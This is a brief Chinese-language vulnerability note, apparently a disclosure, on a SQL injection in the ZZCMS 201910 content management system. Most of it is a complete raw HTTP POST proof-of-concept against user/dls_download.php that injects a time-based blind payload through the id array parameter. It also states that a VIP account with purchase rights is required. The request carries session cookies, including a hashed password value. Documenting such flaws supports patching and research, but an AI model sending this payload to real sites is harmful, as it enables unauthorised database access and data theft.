## ZZCMS201910 SQL Injections SQL注入  

> 前提是你有一个具有购买权限的VIP会员账户
> 不然会提示：`"您所在的用户组没有下载此信息的权限！<br><input  type=button value=升级成VIP会员 onclick=\"location.href='/one/vipuser.php'\"/>"`  

### 注入点 ` user/dls_download with parameter $id`

### 利用POC如下  

```raw
POST /user/dls_download.php HTTP/1.1
Host: test.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Origin: http://test.com
Connection: close
Referer: http://test.com/user/advzt_manage.php
Cookie: Hm_lvt_f6f37dc3416ca514857b78d0b158037e=1576564072; Hm_lvt_520556228c0113270c0c772027905838=1576734687,1577071433; app_href_source=myapp/free; PHPSESSID=f0fb73cc2f2d41d2a3b1edb7340841a3; arrlanguage=metinfo; Hm_lpvt_520556228c0113270c0c772027905838=1577672843; acc_auth=4b90lwFZZGUdz47dUybObYz1MoB612Tg7bCn10U0P4BKoY%2FR9nnvQapvPIBF%2BB4w11KPOWCNH%2FLvwx9rH7424ZH0; acc_key=eXM7G4F; __tins__713776=%7B%22sid%22%3A%201577775703119%2C%20%22vd%22%3A%201%2C%20%22expires%22%3A%201577777503119%7D; __51cke__=; __51laig__=28; bdshare_firstime=1577771760963; UserName=test; PassWord=4297f44b13955235245b2497399d7a93
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

id[]=1&id[]=2)%0aor%0asleep(5)%23&FileExt=xxx
```

来源与：https://github.com/JcQSteven/blog/issues/15